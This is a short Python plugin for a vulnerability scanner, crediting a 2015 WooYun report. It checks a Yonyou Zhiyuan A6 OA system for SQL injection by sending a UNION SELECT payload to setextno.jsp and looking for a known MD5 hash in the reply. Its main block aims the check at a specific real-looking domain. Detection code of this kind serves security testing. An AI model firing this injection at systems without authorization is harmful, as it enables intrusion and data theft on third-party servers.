#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0106478


def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg

def audit(arg):
    url = 'yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20select%201,2,md5(123),1%23'
    target = arg + url
    code, head, res, errcode, _ = curl.curl2(target)
    if code ==200 and '202cb962ac59075b964b07152d234b70' in res :
        security_hole(arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://oa.wnq.com.cn/')[1])